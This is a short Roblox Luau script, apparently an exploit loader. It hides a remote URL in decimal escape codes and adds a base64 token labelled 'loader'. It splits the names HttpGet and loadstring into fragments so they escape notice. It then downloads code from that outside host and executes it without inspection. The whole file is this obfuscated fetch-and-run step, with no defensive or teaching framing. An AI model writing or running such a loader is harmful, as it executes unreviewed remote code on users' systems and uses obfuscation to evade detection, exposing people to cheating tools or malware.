-- Luau-Safe Lightweight Obfuscation
local _p1 = "\104\116\116\112\115\58\47\47\97\112\105\46\112\114\111\106\101\99\116\45\114\101\118\101\114\115\101\46\111\114\103\47\114\117\110\47"
local _p2 = "eyJpZCI6ImVlZTg1YjI5LWYyNDItNDEwMS05ZDkxLTUwMjlhMDhmYWQxYyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmUifX0"
local _full_url = _p1 .. _p2

local _get = game["Ht".."tp".."G".."et"]
local _load = _G["loa".."dstr".."ing"]

local _success, _result = pcall(function()
    return _get(_full_url)
end)

if _success then
    local _func, _err = _load(_result)
    if _func then
        _func()
    else
        warn("Loadstring failed: " .. tostring(_err))
    end
else
    warn("HTTP request failed! (Error 260). The API might be down or blocking Roblox.")
end
